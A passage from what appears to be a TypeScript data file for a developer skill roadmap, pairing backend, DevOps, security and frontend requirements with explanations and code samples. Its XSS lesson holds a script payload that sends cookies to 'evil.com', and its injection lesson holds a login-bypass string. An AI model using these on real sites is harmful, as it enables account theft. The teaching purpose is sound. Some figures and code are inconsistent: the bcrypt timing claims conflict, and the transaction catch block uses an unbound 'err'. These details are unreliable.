router.patch('/:id', validateBody(updateTodoSchema), todoController.update);
router.delete('/:id', todoController.remove);

// controllers/todo.controller.ts — only HTTP wiring
export const create = async (req: Request, res: Response) => {
  // req.body already validated by middleware
  const todo = await todoService.create(req.user!.id, req.body);
  res.status(201).json(todo);
};

// services/todo.service.ts — business logic
export async function create(userId: number, data: CreateTodoInput) {
  return todoRepository.insert({ ...data, userId });
}`,
            language: "ts",
          },
          {
            text: "Input validation using libraries (zod/joi) rather than manual checks.",
            answer:
              "Manual if checks are error-prone and verbose. Zod schemas are declarative, composable, generate TypeScript types automatically, and provide structured error messages. Define once, use in middleware AND in TypeScript types.",
            code: `import { z } from 'zod';

export const createTodoSchema = z.object({
  title: z.string()
    .min(1, 'Title is required')
    .max(255, 'Title too long'),
  categoryId: z.number().int().positive().optional(),
  completed: z.boolean().optional().default(false),
});

// Infer TypeScript type from schema — no duplication
export type CreateTodoInput = z.infer<typeof createTodoSchema>;

// Validation middleware — used in routes
export function validateBody(schema: z.ZodSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ errors: result.error.flatten() });
    }
    req.body = result.data; // replace with parsed+typed data
    next();
  };
}`,
            language: "ts",
          },
          {
            text: "Centralized error handling middleware.",
            answer:
              "Express catches errors thrown inside async handlers ONLY if you wrap them or use a library like express-async-errors. Register the error handler last — after all routes. This avoids try/catch repetition in every route.",
            code: `// utils/asyncHandler.ts
export const asyncHandler =
  (fn: RequestHandler) =>
  (req: Request, res: Response, next: NextFunction) =>
    Promise.resolve(fn(req, res, next)).catch(next); // forward to error handler

// middleware/errorHandler.ts — registered LAST in app.ts
export function errorHandler(
  err: Error, req: Request, res: Response, next: NextFunction
) {
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({ error: err.message });
  }
  console.error(err); // unexpected error
  res.status(500).json({ error: 'Internal server error' });
}

// Route: no try/catch needed
router.get('/', asyncHandler(async (req, res) => {
  const todos = await todoService.list(req.user!.id);
  res.json(todos);
}));`,
            language: "ts",
          },
          {
            text: "Basic authentication: bcrypt password hashing, JWT signing/verification.",
            answer:
              "Passwords hashed with bcrypt (one-way, salted). JWT = Base64(header).Base64(payload).HMAC-signature. Server signs with secret; client stores token; client sends it in Authorization header; server verifies signature on each request — no session state needed.",
            code: `// JWT structure: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc123

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

// Register
const hash = await bcrypt.hash(password, 12);
await userRepo.create({ email, passwordHash: hash });

// Login
const user = await userRepo.findByEmail(email);
const valid = await bcrypt.compare(password, user.passwordHash);
if (!valid) throw new UnauthorizedError('Invalid credentials');

const accessToken = jwt.sign(
  { sub: user.id, email: user.email },
  process.env.JWT_ACCESS_SECRET!,
  { expiresIn: '15m' }    // short-lived
);

// Verify middleware
const payload = jwt.verify(token, process.env.JWT_ACCESS_SECRET!);
// payload.sub = userId`,
            language: "ts",
          },
          {
            text: "SQL: basic JOIN, Foreign Keys, INDEX.",
            answer:
              "FK enforces referential integrity — prevents orphan rows. JOIN combines related rows from two tables. INDEX builds a B-tree structure so WHERE/JOIN lookups are O(log N) instead of O(N) full scans.",
            code: `-- Foreign key with CASCADE
CREATE TABLE todos (
  id          SERIAL PRIMARY KEY,
  user_id     INT REFERENCES users(id) ON DELETE CASCADE,
  category_id INT REFERENCES categories(id) ON DELETE SET NULL,
  title       TEXT NOT NULL
);

-- Index: speeds up queries filtering by user_id
CREATE INDEX idx_todos_user_id ON todos(user_id);

-- JOIN: combine todos with category name in one query
-- avoids N+1 (one query instead of 1 + N)
SELECT
  t.id, t.title, t.completed,
  c.name AS category_name
FROM todos t
LEFT JOIN categories c ON c.id = t.category_id
WHERE t.user_id = $1
ORDER BY t.created_at DESC;`,
            language: "sql",
          },
          {
            text: "Hands-on Action Case: Database Backup/Restore (pg_dump/pg_restore) & Shared DB Migration Safety.",
            answer:
              "Executing backups via pg_dump, restoring to test DBs, and performing non-breaking schema migrations on shared PostgreSQL databases (e.g. todo_db shared by Node, NestJS, FastAPI backends) using nullable columns or default values.",
            code: `# Backup & Restore
docker exec todo-postgres-dev pg_dump -U postgres todo_db > ~/todo_db_backup.sql
docker exec -i todo-postgres-dev psql -U postgres -d todo_db_restore < ~/todo_db_backup.sql

-- Non-breaking migration for shared DB:
-- DO NOT use: ALTER TABLE todos ADD COLUMN category VARCHAR(50) NOT NULL;
-- DO USE:
ALTER TABLE todos ADD COLUMN category VARCHAR(50) DEFAULT 'general';`,
            language: "sql",
          },
        ],
        keywords: [
          "middleware",
          "bcrypt",
          "JWT (access token)",
          "request validation schema",
          "foreign key",
          "ON DELETE CASCADE",
          "parameterized query",
        ],
        applicationNote:
          "be-node-express post-refactor EXCEEDS this level — it features full layer separation, JWT, and Zod validation. Practice exercise: add a priority field (low/medium/high) to todos, writing the SQL migration, and updating todo.repository.ts, todo.service.ts, todo.schema.ts, and the PATCH route. If you can complete this in <30 minutes without TypeScript errors, you have solidly mastered Level 2 BE.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/src/",
            path: "be-node-express/src",
            note: "Full routes → controllers → services → repositories layered architecture",
            language: "ts",
            codeSnippet: `// routes/todo.routes.ts
const router = Router();

router.use(authenticateJwt);  // all routes require JWT

router.get('/stats', todoController.stats);
router.get('/', todoController.list);
router.post(
  '/',
  validateBody(createTodoSchema),  // Zod validation middleware
  todoController.create
);
router.patch(
  '/:id',
  validateBody(updateTodoSchema),
  todoController.update
);
router.delete('/:id', todoController.remove);

export default router;`,
          },
          {
            project: "foresight-2",
            label: "foresight-bgs/API/Program.cs",
            path: "repo/foresight-bgs/API/Program.cs",
            note: "Real CORS dynamics in C# .NET: UseCors for local dev, proxied in prod — same principle as Express cors()",
            language: "csharp",
            codeSnippet: `// foresight-bgs/API/Program.cs — production C# .NET GraphQL API
// Key pattern: API versioning via custom header
public static readonly DateTime PiscadaApiVersionOpaqueIds = new DateTime(2026, 2, 10);
// When Piscada-API-Version >= this date: return bare UUID only (breaking change)
// When absent or earlier: preserve old id format — backward compatible

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddGraphQL(b => b
  .AddSchema(provider => GraphQLSchema.Schema)
  .AddSystemTextJson()
  .AddWebSockets()
);

// CORS: required only for local dev (no proxy).
// In staging/prod a reverse proxy (nginx/oauth2-proxy) handles CORS headers.
builder.Services.AddCors(options => {
  options.AddDefaultPolicy(policy => {
    policy.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader();
  });
});

var app = builder.Build();
app.UseCors();  // commented out in prod — handled by proxy
app.UseWebSockets();
app.UseGraphQL("/graphql");`,
          },
        ],
        gaps: [],
      },
      {
        name: "DevOps",
        status: "exceeded",
        requirements: [
          {
            text: "Ability to write a single-stage Dockerfile for a Node.js service.",
            answer:
              "Copy package manifests first so the npm install layer is cached — it only re-runs when the lockfile changes, not on every code change. This is the most important Docker caching trick.",
            code: `FROM node:18-alpine
WORKDIR /app

# 1. Copy manifests FIRST — layer cached if package.json unchanged
COPY package*.json ./
RUN npm install           # cached on clean package.json

# 2. Copy source AFTER — only invalidates source layer
COPY . .

EXPOSE 3000
CMD ["node", "index.js"]`,
            language: "dockerfile",
          },
          {
            text: "Writing a docker-compose.yml for multiple dependent services.",
            answer:
              "Named volumes persist database data across container restarts. Services on the same network resolve each other by service name. depends_on only waits for the container to start, not for it to be healthy — use healthcheck + condition: service_healthy for real readiness.",
            code: `services:
  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: todo_db
      POSTGRES_PASSWORD: postgres
    volumes:
      - pgdata:/var/lib/postgresql/data  # named volume: persists
    networks: [app-net]
    healthcheck:
      test: ["CMD", "pg_isready", "-U", "postgres"]
      interval: 5s
      retries: 5

  backend:
    build: .
    ports: ["3000:3000"]
    environment:
      DATABASE_URL: postgres://postgres:postgres@db:5432/todo_db
    depends_on:
      db:
        condition: service_healthy  # wait for real readiness
    networks: [app-net]

networks:
  app-net:
volumes:
  pgdata:`,
            language: "yaml",
          },
          {
            text: "Reading and understanding a basic YAML CI pipeline (GitHub Actions).",
            answer:
              "Each push triggers jobs that run in isolated VMs. Steps execute sequentially. paths-filter prevents wasteful rebuilds when only unrelated service directories changed — critical for monorepos.",
            code: `# .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  build-be-node:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Check if be-node-express changed
        id: filter
        uses: dorny/paths-filter@v3
        with:
          filters: |
            be: ['be-node-express/**']

      - uses: actions/setup-node@v4
        if: steps.filter.outputs.be == 'true'
        with: { node-version: 18 }

      - run: npm ci
        if: steps.filter.outputs.be == 'true'
        working-directory: be-node-express

      - run: npm run build
        if: steps.filter.outputs.be == 'true'
        working-directory: be-node-express`,
            language: "yaml",
          },
          {
            text: "Hands-on Action Case: Ubuntu Resource Diagnostics, Cronjobs & SSL/Certbot Setup.",
            answer:
              "Diagnosing server disk usage (df -h, du -sh), RAM (free -h), automating log cleanup via crontab, and securing Nginx with Let's Encrypt SSL certificates (certbot --nginx).",
            code: `# Disk & RAM inspection
df -h
free -h
du -sh /var/log/* | sort -hr

# Cronjob (crontab -e)
0 0 * * * rm -rf /tmp/*.log

# SSL / Certbot setup
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d api.yourdomain.com`,
            language: "bash",
          },
        ],
        keywords: [
          "depends_on",
          "named volume",
          "bridge network",
          "CI trigger (push/pull_request)",
          "actions/checkout",
          "actions/setup-node",
        ],
        applicationNote:
          "Read and explain the entirety of docker-compose.yml and .github/workflows/ci.yml — understanding why each service has its own job with paths-filter (only building when that directory changes) is a great example of effective monorepo CI.",
        projectRefs: [
          {
            project: "todo-app",
            label: ".github/workflows/ci.yml",
            path: ".github/workflows/ci.yml",
            note: "Monorepo CI with paths-filter per service — only rebuilds what changed",
            language: "yaml",
            codeSnippet: `# .github/workflows/ci.yml — monorepo CI
name: Monorepo CI/CD Pipeline
on:
  push:
    branches: [main, master]
  pull_request:
    branches: [main, master]

jobs:
  be-node-express:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Key pattern: only run if files in this service changed.
      # Without paths-filter every push rebuilds all 5 services.
      - name: Filter changes
        id: filter
        uses: dorny/paths-filter@v3
        with:
          filters: |
            express:
              - 'be-node-express/**'
              - '.github/workflows/ci.yml'

      - name: Setup Node.js
        if: steps.filter.outputs.express == 'true'
        uses: actions/setup-node@v4
        with: { node-version: 18 }

      - name: Install & Build
        if: steps.filter.outputs.express == 'true'
        run: cd be-node-express && npm install && npm run build

      - name: Test Docker Build
        if: steps.filter.outputs.express == 'true'
        run: docker build -t todo-be-express ./be-node-express`,
          },
          {
            project: "foresight-mini",
            label: "docker-compose.yml",
            path: "docker-compose.yml",
            note: "Complete IoT pipeline: simulator → MQTT → adapter → NATS → worker → Postgres → GraphQL → React",
            language: "yaml",
            codeSnippet: `# Device simulator publishes fake readings
simulator:
  build: ./services/simulator
  depends_on: [mosquitto]
  environment:
    MQTT_URL: mqtt://mosquitto:1883

# Adapter: stateless MQTT → NATS protocol translation
adapter:
  build: ./services/adapter
  depends_on: [mosquitto, nats]
  environment:
    MQTT_URL: mqtt://mosquitto:1883
    NATS_URL: nats://nats:4222

# Worker: NATS subscriber that writes to Postgres timeseries
worker:
  build: ./services/worker
  depends_on:
    nats: { condition: service_started }
    postgres: { condition: service_healthy }  # waits for healthcheck pass
  environment:
    NATS_URL: nats://nats:4222
    DATABASE_URL: postgres://foresight:foresight@postgres:5432/foresight

# API: GraphQL query layer with Redis read cache
api:
  build: ./services/api
  ports: ["4000:4000"]
  environment:
    DATABASE_URL: postgres://foresight:foresight@postgres:5432/foresight
    REDIS_URL: redis://redis:6379
    JWT_SECRET: ""   # empty = auth disabled for local dev`,
          },
        ],
        gaps: [],
      },
      {
        name: "Security",
        status: "exceeded",
        requirements: [
          {
            text: "Properly hashing passwords (bcrypt, understanding salt rounds).",
            answer:
              "Salt rounds = iterations = 2^N hash computations. 12 rounds = 4096 iterations — slow enough that brute-forcing 1M passwords takes weeks. Salt is random per-password so identical passwords produce different hashes, defeating rainbow tables.",
            code: `import bcrypt from 'bcrypt';

// SALT_ROUNDS=12 → 2^12=4096 iterations per hash
// ~100ms per hash on modern hardware — negligible for login,
// but ~4 hours to test 1M guesses at 256/s
const SALT_ROUNDS = 12;

export function hashPassword(plain: string): Promise<string> {
  return bcrypt.hash(plain, SALT_ROUNDS);
  // bcrypt auto-generates a random salt and embeds it in the output:
  // $2b$12$<22-char-salt><31-char-hash>
}

export function comparePassword(
  plain: string, hash: string
): Promise<boolean> {
  // Extracts salt from hash, re-hashes plain, compares
  return bcrypt.compare(plain, hash);
}`,
            language: "ts",
          },
          {
            text: "Always using parameterized queries — explaining how SQL injection occurs when concatenating strings directly.",
            answer:
              "String concatenation lets user input escape the query context. Parameterized queries send code and data separately — the database driver escapes data before inserting it into the query tree, so it's always treated as a value, never as SQL code.",
            code: `// ❌ SQL injection via string concatenation
const email = "' OR '1'='1";
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;
// Resulting SQL:
// SELECT * FROM users WHERE email = '' OR '1'='1'
// → returns ALL users!

// ✅ Parameterized query — driver escapes data
await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [email]  // passed separately, never interpolated
);

// ✅ ORDER BY exception — can't parameterize column names
// Use a whitelist in the service layer:
const SORTABLE = new Set(['title', 'created_at', 'completed']);
if (!SORTABLE.has(sortBy)) throw new Error('Invalid sortBy');
const sql = \`SELECT * FROM todos ORDER BY \${sortBy} \${sortDir}\`;`,
            language: "ts",
          },
          {
            text: "Configuring CORS properly (never origin:'*' when credentials:true is required).",
            answer:
              "CORS is a browser mechanism — it doesn't protect server-to-server calls. credentials:true sends cookies/auth headers cross-origin. Browsers block this with a wildcard origin — you must reflect the exact requesting origin.",
            code: `// ❌ Broken: browser rejects credentials with wildcard
app.use(cors({ origin: '*', credentials: true }));
// Error: CORS header 'Access-Control-Allow-Origin' = '*'
// cannot be used with credentials

// ✅ Reflect exact origin (dev: any, prod: allowlist)
app.use(cors({
  origin: true,          // reflects requesting origin exactly
  credentials: true,     // allows cookies + Authorization header
}));

// ✅ Production: explicit allowlist
const ALLOWED = new Set([
  'https://app.example.com',
  'https://staging.example.com',
]);
app.use(cors({
  origin: (origin, cb) =>
    ALLOWED.has(origin ?? '') ? cb(null, true) : cb(new Error('Not allowed')),
  credentials: true,
}));`,
            language: "ts",
          },
          {
            text: "Understanding XSS and why React automatically escapes output.",
            answer:
              "XSS = attacker injects a <script> tag that executes in another user's browser, stealing cookies/tokens. React escapes all string values rendered in JSX to HTML entities, so they display as text not code. dangerouslySetInnerHTML opts out — never use it with user content.",
            code: `// ❌ Vulnerable: raw HTML injection
const userBio = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
return <div dangerouslySetInnerHTML={{ __html: userBio }} />;
// → script EXECUTES in victim's browser

// ✅ React auto-escapes in JSX curly braces
return <div>{userBio}</div>;
// Renders safely as:
// &lt;script&gt;fetch(...)&lt;/script&gt;
// (just text, not executable)

// Stored XSS flow:
// 1. Attacker stores <script>...</script> as a todo title
// 2. Server saves it to DB
// 3. Another user loads the page
// 4. Without escaping: script executes as that user
// 5. With React JSX: displayed as harmless text`,
            language: "tsx",
          },
        ],
        keywords: [
          "bcrypt salt rounds",
          "parameterized query",
          "CORS origin vs credentials",
          "XSS",
          "output escaping",
        ],
        applicationNote:
          "src/utils/password.ts uses bcrypt with 12 salt rounds; all queries in src/repositories/ use $1, $2 parameters instead of string concatenation. Key detail: todo.repository.ts is the ONLY place with direct string concatenation in SQL (sortBy/sortDir for ORDER BY) — read todo.service.ts to see why validating input against a strict whitelist (SORTABLE_COLUMNS) before reaching the repository is mandatory.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/src/utils/password.ts",
            path: "be-node-express/src/utils/password.ts",
            note: "bcrypt with 12 salt rounds",
            language: "ts",
            codeSnippet: `import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;

export function hashPassword(plain: string): Promise<string> {
  return bcrypt.hash(plain, SALT_ROUNDS);
}

export function comparePassword(
  plain: string,
  hash: string
): Promise<boolean> {
  return bcrypt.compare(plain, hash);
}`,
          },
          {
            project: "todo-app",
            label: "be-node-express/src/repositories/",
            path: "be-node-express/src/repositories",
            note: "All SQL uses $1,$2 params. See SORTABLE_COLUMNS whitelist in todo.service.ts for ORDER BY injection prevention",
            language: "ts",
            codeSnippet: `// sortBy/sortDir are validated against a whitelist before
// reaching here (see todo.service.ts) — safe to interpolate.
const orderClause = \`t.\${sortBy} \${sortDir}\`;

// All user-supplied values use $N placeholders:
const countResult = await pool.query<{ count: string }>(
  \`SELECT COUNT(*) FROM todos t WHERE \${whereClause}\`,
  values,  // [userId, ...filters]
);

// Parameterised INSERT — never string-concatenated:
await pool.query(
  'INSERT INTO todos (user_id, title) VALUES ($1, $2)',
  [userId, title],
);`,
          },
        ],
        gaps: [],
      },
    ],
  },
  {
    id: 3,
    slug: "mid",
    title: "Level 3",
    subtitle: "Middle",
    experience: "1.5 – 3 years",
    overallStatus: "🟡 Mostly Met",
    statusColor: "yellow",
    selfCheck:
      "You can design a database schema with proper transactions, write integration tests simulating real HTTP requests (supertest) without executing manual curl commands, explain why offset pagination degrades on deep pages in large tables (and how cursor pagination resolves it), write a CI workflow executing automated test suites, and articulate what specific attack vector refresh token rotation prevents.",
    domains: [
      {
        name: "Frontend",
        status: "not-met",
        requirements: [
          {
            text: "Proper server state management: TanStack Query / SWR instead of manual useEffect+useState.",
            answer:
              "React Query handles caching, deduplication, background refetch, and stale-while-revalidate automatically. Manual useEffect forces you to re-implement all of this. Key concepts: queryKey identifies the cache entry; invalidateQueries triggers a refetch after mutations.",
            code: `import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function TodoList() {
  const queryClient = useQueryClient();

  // ✅ Caching, background refetch, deduplication automatic
  const { data: todos, isLoading, error } = useQuery({
    queryKey: ['todos'],
    queryFn: () => fetch('/api/todos').then(r => r.json()),
    staleTime: 30_000,   // consider fresh for 30s
  });

  // Mutation with cache invalidation
  const toggle = useMutation({
    mutationFn: (id: number) =>
      fetch('/api/todos/' + id, { method: 'PATCH', body: JSON.stringify({ completed: true }) }),
    onSuccess: () =>
      // Refetch todos so UI reflects new state
      queryClient.invalidateQueries({ queryKey: ['todos'] }),
    // Optimistic update: instant UI, rollback on error
    onMutate: async (id) => {
      await queryClient.cancelQueries({ queryKey: ['todos'] });
      const prev = queryClient.getQueryData(['todos']);
      queryClient.setQueryData(['todos'], (old: Todo[]) =>
        old.map(t => t.id === id ? { ...t, completed: !t.completed } : t)
      );
      return { prev }; // snapshot for rollback
    },
    onError: (_err, _id, ctx) =>
      queryClient.setQueryData(['todos'], ctx?.prev),
  });

  if (isLoading) return <p>Loading…</p>;
  return <ul>{todos?.map(t => <li key={t.id}>{t.title}</li>)}</ul>;
}`,
            language: "tsx",
          },
          {
            text: "Performance: React.memo, code splitting (React.lazy + Suspense).",
            answer:
              "React re-renders a component whenever its parent re-renders. React.memo skips re-render if props didn't change. Code splitting with React.lazy loads a component's JS bundle only when first needed — reduces initial bundle size.",
            code: `import { lazy, Suspense, memo } from 'react';

// Code splitting: AnalyticsDashboard bundle loads only on navigation
const AnalyticsDashboard = lazy(() => import('./AnalyticsDashboard'));

function App() {
  const [showAnalytics, setShowAnalytics] = useState(false);
  return (
    <div>
      <button onClick={() => setShowAnalytics(true)}>Analytics</button>
      {showAnalytics && (
        <Suspense fallback={<p>Loading dashboard…</p>}>
          <AnalyticsDashboard />  {/* JS loaded lazily here */}
        </Suspense>
      )}
    </div>
  );
}

// React.memo: skip re-render if props are shallowly equal
const TodoItem = memo(function TodoItem({ todo, onToggle }) {
  console.log('rendered:', todo.id); // only logs when todo/onToggle changes
  return <li onClick={() => onToggle(todo.id)}>{todo.title}</li>;
});`,
            language: "tsx",
          },
          {
            text: "Testing: component unit testing with Jest + React Testing Library.",
            answer:
              "RTL philosophy: test what the user sees and does, not internal implementation. Query by accessible role/text, fire events, assert visible DOM output. Never query by CSS class or component internals.",
            code: `import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { TodoList } from './TodoList';

describe('TodoList', () => {
  it('adds a todo when form submitted', async () => {
    render(<TodoList />);

    // Query like a user: find by placeholder / role, not by class
    const input  = screen.getByPlaceholderText('New todo…');
    const button = screen.getByRole('button', { name: /add/i });

    fireEvent.change(input, { target: { value: 'Buy milk' } });
    fireEvent.click(button);

    // Assert visible output (not state)
    expect(await screen.findByText('Buy milk')).toBeInTheDocument();
  });

  it('shows error when title empty', () => {
    render(<TodoList />);
    fireEvent.click(screen.getByRole('button', { name: /add/i }));
    expect(screen.getByText('Title is required')).toBeInTheDocument();
  });
});`,
            language: "tsx",
          },
          {
            text: "Stricter TypeScript: generics, discriminated unions, avoiding any.",
            answer:
              "Generics make functions type-safe without duplicating them. Discriminated unions let TypeScript narrow types in switch/if blocks — it knows which properties exist based on the tag field. Never use any — use unknown and narrow it.",
            code: `// Generic: one function, multiple types
function findById<T extends { id: number }>(items: T[], id: number): T | undefined {
  return items.find(item => item.id === id);
}

// Discriminated union: status tag narrows type
type LoadState<T> =
  | { status: 'idle' }
  | { status: 'loading' }
  | { status: 'error'; message: string }
  | { status: 'success'; data: T };

function render<T>(state: LoadState<T>) {
  switch (state.status) {
    case 'error':
      // TypeScript KNOWS state.message exists here
      return <p>Error: {state.message}</p>;
    case 'success':
      // TypeScript KNOWS state.data exists here
      return <pre>{JSON.stringify(state.data)}</pre>;
  }
}

// unknown instead of any:
function parseJson(raw: unknown): Todo[] {
  if (!Array.isArray(raw)) throw new Error('Expected array');
  return raw as Todo[]; // only after narrowing
}`,
            language: "tsx",
          },
          {
            text: "SSR/CSR/SSG concepts (Next.js app router) and Web Vitals.",
            answer:
              "CSR: JS runs in browser, blank HTML until JS loads (bad LCP). SSR: HTML pre-rendered on server per request (good LCP, good SEO, server load). SSG: HTML pre-generated at build time (best performance, only for static content). LCP=largest paint, CLS=layout shift, INP=interaction response.",
            code: `// Next.js App Router — each file is a server component by default
// app/todos/page.tsx — SSR: rendered on server per request
export default async function TodosPage() {
  // This fetch runs on the server, not the browser
  const todos = await fetch('http://api/todos').then(r => r.json());
  return <ul>{todos.map(t => <li key={t.id}>{t.title}</li>)}</ul>;
}

// 'use client' directive opts into CSR for interactive parts
'use client';
import { useState } from 'react';
export function AddTodoButton({ onAdd }) {
  const [open, setOpen] = useState(false);
  return <button onClick={() => setOpen(true)}>Add</button>;
}

// SSG: generateStaticParams for dynamic routes
export async function generateStaticParams() {
  const todos = await fetchAllTodos();
  return todos.map(t => ({ id: String(t.id) }));
}`,
            language: "tsx",
          },
        ],
        keywords: [
          "React Query",
          "cache invalidation",
          "optimistic update",
          "Redux Toolkit slice",
          "Zustand store",
          "code splitting",
          "React.memo",
          "discriminated union",
          "hydration",
          "Web Vitals",
          "a11y",
        ],
        applicationNote:
          "NOT YET implemented in current fe-vite/fe-nextjs — both currently handle fetching via raw useState/useEffect, lacking React Query and automated test suites.",
        projectRefs: [
          {
            project: "foresight-2",
            label: "foresight-cloud-bms (TanStack Query factory pattern)",
            path: "repo/foresight-cloud-bms/src",
            note: "queryOptions(...) factory: staleTime: POSITIVE_INFINITY for buildings, 30_000ms for sensor values",
            language: "ts",
            codeSnippet: `// query.ts — queryOptions factory for buildings
export const buildingsQueryOptions = (apolloClient: ApolloClient, ids: ReadonlyArray<string>) =>
  queryOptions({
    queryKey: ["buildings", { ids: [...ids].sort() }],
    queryFn: async () => {
      const { data } = await apolloClient.query({
        query: BuildingsQuery,   // gql\`query Buildings($ids: [ID!]!) { ... }\`
        variables: { ids: [...ids] },
      });
      return data?.foresightEntitiesByIDs ?? null;
    },
    enabled: ids.length > 0,
    staleTime: Number.POSITIVE_INFINITY,  // buildings = stable graph entities
    gcTime:    Number.POSITIVE_INFINITY,  // never evict from memory
  });

// use-buildings/index.ts — the hook is just one line
export const useBuildings = ({ ids }: { ids: ReadonlyArray<string> }) => {
  const apolloClient = useApolloClient();
  return useQuery(buildingsQueryOptions(apolloClient, ids));
};

// Contrast: sensor values use a shorter staleTime
export const sensorReadingsQueryOptions = (apolloClient, sensorId) =>
  queryOptions({
    queryKey: ["sensorReadings", sensorId],
    queryFn: async () => { /* ... */ },
    staleTime: 30_000,   // sensor data refreshes every 30s
  });`,
          },
          {
            project: "foresight-mini",
            label: "frontend/src/App.tsx",
            path: "frontend/src/App.tsx",
            note: "React dashboard polling GraphQL every 2s — cleanup cancellation pattern prevents state updates after unmount",
            language: "tsx",
            codeSnippet: `// foresight-mini/frontend/src/App.tsx — real-time polling via useEffect
export default function App() {
  const [buildings, setBuildings] = useState<Building[]>([]);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;  // ← cleanup flag prevents stale state updates

    async function load() {
      try {
        const data = await fetchBuildings();  // POST /graphql
        if (!cancelled) {                      // guard: component still mounted?
          setBuildings(data);
          setError(null);
        }
      } catch (err) {
        if (!cancelled) setError((err as Error).message);
      }
    }

    load();
    // Polling instead of WebSocket subscription — simplest live-data pattern.
    // The real platform pushes state updates over NATS instead of polling.
    const interval = setInterval(load, 2000);

    return () => {
      cancelled = true;       // ← prevent setState after unmount
      clearInterval(interval); // ← stop polling on unmount
    };
  }, []);  // ← empty deps: run once, cleanup on unmount

  return (
    <div className="app">
      <h1>Foresight Mini</h1>
      {buildings.map(b => (
        <section key={b.id}>
          <h2>{b.name}</h2>
          {b.devices.map(d => (
            <div key={d.id}>
              {d.sensors.map(s => (
                <div key={s.id}>
                  <span>{s.name} ({s.unit})</span>
                  <Sparkline readings={s.readings} />
                </div>
              ))}
            </div>
          ))}
        </section>
      ))}
    </div>
  );
}`,
          },
        ],
        gaps: [
          "Refactor fe-vite to use TanStack Query for GET/POST/PATCH/DELETE /api/todos.",
          "Implement optimistic updates when toggling completed.",
          "Write RTL tests for TodoList.",
        ],
      },
      {
        name: "Backend",
        status: "partial",
        requirements: [
          {
            text: "Standard REST API design: pagination, filtering, sorting, versioning.",
            answer:
              "Offset pagination is simple but slow on deep pages (DB scans and discards N rows). Cursor pagination seeks directly to last seen ID — O(log N). Always version your API (/api/v1) so breaking changes don't force all clients to update at once.",
            code: `// Offset pagination (simple, degrades at scale)
GET /api/v1/todos?page=2&limit=20
// SQL: LIMIT 20 OFFSET 20 — scans 40 rows, returns last 20

// Cursor pagination (production-grade)
GET /api/v1/todos?after=<cursor>&limit=20
// SQL: WHERE id > $cursor ORDER BY id LIMIT 20
// Seeks directly by index — no scan

// In Express route handler:
router.get('/', asyncHandler(async (req, res) => {
  const page     = Number(req.query.page  ?? 1);
  const limit    = Math.min(Number(req.query.limit ?? 20), 100);
  const sortBy   = SORTABLE.has(req.query.sortBy) ? req.query.sortBy : 'created_at';
  const sortDir  = req.query.sortDir === 'ASC' ? 'ASC' : 'DESC';

  const { rows, total } = await todoService.list({
    userId: req.user!.id, page, limit, sortBy, sortDir,
    completed: req.query.completed === 'true' ? true
              : req.query.completed === 'false' ? false
              : undefined,
  });
  res.json({ data: rows, total, page, limit });
}));`,
            language: "ts",
          },
          {
            text: "Advanced SQL: EXPLAIN ANALYZE, composite indexes, N+1 queries, transactions.",
            answer:
              "N+1: fetching N todos then running 1 query per todo for the category = N+1 queries. Fix with JOIN. EXPLAIN ANALYZE shows whether a query hits an index (Index Scan) or does a full scan (Seq Scan). Composite index column order matters: put equality columns first, range/sort last.",
            code: `-- N+1 problem vs JOIN solution
-- ❌ N+1: 1 query + N category queries
SELECT * FROM todos WHERE user_id = 1;  -- returns 100 todos
SELECT * FROM categories WHERE id = 3; -- repeated 100 times!

-- ✅ JOIN: one query
SELECT t.*, c.name AS category_name
FROM todos t
LEFT JOIN categories c ON c.id = t.category_id
WHERE t.user_id = 1;

-- Composite index for (user_id, completed) filter + created_at sort
CREATE INDEX idx_todos_user_completed_created
  ON todos(user_id, completed, created_at DESC);

-- Verify it's used:
EXPLAIN ANALYZE
SELECT * FROM todos WHERE user_id=1 AND completed=false
ORDER BY created_at DESC LIMIT 20;
-- Look for: Index Scan using idx_todos_user_completed_created

-- Transaction: atomic fund transfer
const client = await pool.connect();
try {
  await client.query('BEGIN');
  await client.query('UPDATE accounts SET balance=balance-$1 WHERE id=$2', [100, fromId]);
  await client.query('UPDATE accounts SET balance=balance+$1 WHERE id=$2', [100, toId]);
  await client.query('COMMIT');
} catch { await client.query('ROLLBACK'); throw err; }
finally { client.release(); }`,
            language: "sql",
          },
          {
            text: "Auth: JWT (stateless) vs session (stateful), refresh token rotation.",
            answer:
              "JWT: stateless — no DB lookup per request, but can't revoke individual tokens before expiry. Session: stateful — server stores session in DB/Redis, can revoke instantly, but requires lookup per request. Refresh token rotation: issue a new refresh token with each access token refresh; if old token is reused, detect replay attack and revoke the whole family.",
            code: `// JWT flow (stateless)
// Access token: 15min, stored in memory
// Refresh token: 7 days, stored in httpOnly cookie

export async function rotateRefreshToken(presented: string): Promise<TokenPair> {
  const payload = verifyRefreshToken(presented); // throws if expired/invalid

  const stored = await refreshTokenRepo.findActive(hashToken(presented));
  if (!stored) {
    // Reuse detected — token already consumed. Possible replay attack.
    // Revoke entire token family to force re-login.
    throw new UnauthorizedError('Refresh token reused — possible replay attack');
  }

  await refreshTokenRepo.revoke(hashToken(presented)); // invalidate old
  return issueTokenPair(await userRepo.findById(payload.sub)); // issue new pair
}

// Session flow (stateful) — simpler revocation
req.session.destroy(); // instant revocation, no token hunting`,
            language: "ts",
          },
          {
